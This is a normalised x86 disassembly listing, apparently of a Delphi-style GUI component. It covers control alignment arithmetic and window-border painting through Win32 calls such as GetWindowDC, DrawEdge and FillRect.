inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_496d78
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_496e6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4483f8
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_496e75
mov eax [ ebp - 0x14 ]
call sub_4481b0
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_424744
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4246e8
mov edi eax
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1e0 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_496e84
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_496d78
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_496eb0
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_477028
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_496d78
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_496d78
mov edx eax
mov eax esi
call sub_47bed4
sub_496ef8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4924f8
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_496f40
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_496504
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_48e224
sub_496f88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x70 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor ebx ebx
mov [ edx ] ebx
mov ebx [ esi + 0x70 ]
mov ebx [ ebx + 0x14 ]
mov [ edx ] ebx
jmp r-xdata
xor ebx ebx
mov [ ecx ] ebx
mov ebx [ esi + 0x70 ]
mov ebx [ ebx + 0x10 ]
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov ebx [ ebp + 0xc ]
xor edi edi
mov [ ebx ] edi
mov ebx [ esi + 0x70 ]
mov ebx [ ebx + 0xc ]
mov edi [ ebp + 0xc ]
mov [ edi ] ebx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax ] ebx
mov eax [ esi + 0x70 ]
mov eax [ eax + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov ebx [ esi + 0x74 ]
add eax [ ebx + 0x10 ]
cmp [ edx ] 0x0
jle r-xdata
test [ esi + 0x52 ] 0x10
je r-xdata
mov ebx [ ebp + 0xc ]
cmp eax [ ebx ]
jg r-xdata
add [ edx ] eax
mov eax [ esi + 0x74 ]
mov eax [ eax + 0xc ]
mov ebx [ esi + 0x74 ]
add eax [ ebx + 0x14 ]
cmp [ ecx ] 0x0
jle r-xdata
mov ebx [ ebp + 0xc ]
sub [ ebx ] eax
mov ebx [ ebp + 0x8 ]
cmp eax [ ebx ]
jg r-xdata
add [ ecx ] eax
mov ebx [ ebp + 0x8 ]
sub [ ebx ] eax
sub_49704c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_496c14
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_492534
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x60 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
lea eax [ ebp - 0x60 ]
call sub_432b10
test al al
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x58 ]
sub edx [ ebp - 0x60 ]
sub eax edx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x54 ]
sub edx [ ebp - 0x5c ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x58 ]
sub edx [ ebp - 0x60 ]
sub eax edx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x54 ]
sub edx [ ebp - 0x5c ]
sub eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor eax eax
push ebp
push sub_4974bd
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_492534
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_496f88
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4924f8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
movzx eax [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x58 ]
sub edx [ ebp - 0x60 ]
sub edx eax
sub edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
movzx eax [ ebx + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x58 ]
sub edx [ ebp - 0x60 ]
add edx [ ebp - 0x44 ]
sub edx eax
mov [ ebp - 0x44 ] edx
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov [ ebp - 0x4e ] 0x0
jmp r-xdata
mov [ ebp - 0x4e ] 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov [ ebp - 0x4e ] 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
movzx eax [ ebp - 0x4d ]
dec eax
sub al 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x54 ]
sub edx [ ebp - 0x5c ]
sub edx eax
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x4e ] 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x54 ]
sub edx [ ebp - 0x5c ]
add edx [ ebp - 0x4c ]
sub edx eax
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov [ ebp - 0x4e ] 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x40 ]
jge r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x30 ] eax
mov eax [ ebx + 0x74 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x34 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4e ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x40 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x44 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cmp eax [ ebp - 0x24 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x38 ] eax
mov eax [ ebx + 0x74 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add [ ebp - 0x3c ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4974d5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_49704c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_48f14c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_497514
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_49066c
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_48d7e4
cmp [ edi + 0x160 ] 0x0
jne r-xdata
sub_49755c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_490890
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x160 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_49758c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc0 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov eax [ ebp - 0x4 ]
call sub_492038
xor edx edx
push ebp
push sub_4976ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_492534
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_492534
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4976c1
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_492040
retn
inc ebx
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
test dl dl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x34 ]
jmp r-xdata
add dl 0xfd
sub dl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec ebx
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x5b ]
sub dl 0x3
jae r-xdata
xor esi esi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4924f8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edi edi
mov edi [ ebp - 0x20 ]
sub edi [ ebp - 0x30 ]
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx edi
mov edx [ eax + 0x40 ]
sub edx esi
mov esi [ eax ]
call [ esi + 0x88 ]
sub_4976c1
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x28 ]
sub ecx [ ebp - 0x30 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
sub_497754
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x1a7 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x1a7 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_48f2b0
retn
cmp cl [ eax + 0x1a8 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x1a8 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_48f2b0
sub_497798
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x1a6 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x1a6 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_48f2b0
sub_497808
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x1b0 ]
neg eax
push eax
mov edx [ ebx + 0x1b0 ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov edx [ ebx + 0x1ac ]
add eax edx
mov esi edi
test [ ebx + 0x1a6 ] 0x1
je r-xdata
mov edx [ ebx + 0x1ac ]
add eax edx
test [ ebx + 0x1a6 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x1a6 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x1a6 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_49789c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_497b47
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push 0x0
call MapWindowPoints
mov ecx [ ebp - 0x28 ]
neg ecx
mov edx [ ebp - 0x2c ]
neg edx
lea eax [ ebp - 0x1c ]
call sub_432b28
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowLongW
mov ebx eax
test ebx 0x200000
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
jbe r-xdata
test ebx 0x100000
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44cfd0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a9 ] 0x0
je r-xdata
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
cmp eax 0x1
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x1a7 ]
test dl dl
je r-xdata
call sub_44c2c8
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_44ce50
lea edx [ ebp - 0x1c ]
push edx
mov edx [ ebp - 0x8 ]
push eax
call GetRgnBox
push 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
push 0x0
call MapWindowPoints
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x2c ]
call sub_432ab0
mov ecx [ ebp - 0x38 ]
neg ecx
mov edx [ ebp - 0x3c ]
neg edx
lea eax [ ebp - 0x2c ]
call sub_432b28
mov ecx [ ebp - 0x28 ]
neg ecx
mov edx [ ebp - 0x2c ]
neg edx
lea eax [ ebp - 0x2c ]
call sub_432b28
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1a8 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
add esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ReleaseDC
retn
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1a6 ] 0x1
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x1ac ]
add esi ecx
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1a6 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1a6 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] esi
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x1a6 ] 0x8
je r-xdata
add [ ebp - 0x24 ] esi
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x1a6 ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1a9 ]
or ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x1e1 ]
or ecx [ ebx * 4 + rw-data ]
or ecx 0x2000
push ecx
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
push edx
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
add [ ebp - 0x20 ] esi
sub_497b84
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
